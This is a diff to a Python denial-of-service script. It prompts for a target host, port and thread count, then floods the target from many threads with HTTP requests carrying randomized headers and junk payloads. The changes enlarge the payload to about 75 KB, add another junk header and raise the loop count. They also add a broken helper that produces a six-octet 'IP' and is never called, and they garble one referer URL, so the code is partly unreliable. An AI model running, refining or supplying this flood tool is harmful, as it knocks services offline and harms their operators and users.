@@ -1,7 +1,8 @@
-import os, sys
-import socket, requests
-import random
 import threading
+import os, sys
+import socket
+import random
+import requests
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
@@ -18,7 +19,7 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
 "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
 ref=['http://www.bing.com/search?q=',
-'https://www.yandex.com/yandsearch?text=',
+'https://www.ndex.com/ndsearch?text=',
 'https://duckduckgo.com/?q=']
 acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 "Accept-Encoding: gzip, deflate\r\n",
@@ -233,9 +234,27 @@ ip = str(input('[+] Target: '))
 port = int(input('[+] Port: '))
 pack = int(input('[+] Packet/s: '))
 thread = int(input('[+] Threads: '))
+def randomip():
+  randip = [192, 168, 0, 1]
+  randip1 = random.randint(3,255)
+  randip2 = random.randint(3,255)
+  randip3 = random.randint(3,255)
+  randip4 = random.randint(3,255)
+  randip5 = random.randint(3,255)
+ 
+  
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+  randip.append(randip5) 
+  
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
+  return(randip)
 def start():
     global useragents, ref, acceptall, lolagent
-    hh = random._urandom(3016)
+    hh = random._urandom(75006)
     xx = int(0)
     lolaccept ="LolAccept: "+random.choice(lolagent)+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+str(ip)+"\r\n"
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
@@ -244,7 +263,8 @@ def start():
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    main_req  = target_host + useragen + accept + reffer + lolaccept+ content + length + "\r\n"
+    lolfirst = "GetFirst: "+random.choice(lolagent)+random.choice(ref)+random.choice(acceptall)+random.choice(useragents)+"\r\n"
+    main_req  = target_host + useragen + accept + lolfirst + reffer + lolaccept+ content + length + "\r\n"
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -261,5 +281,6 @@ def start():
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
-for i in range(5000):
+for i in range(15000):
     thred.join()
+    
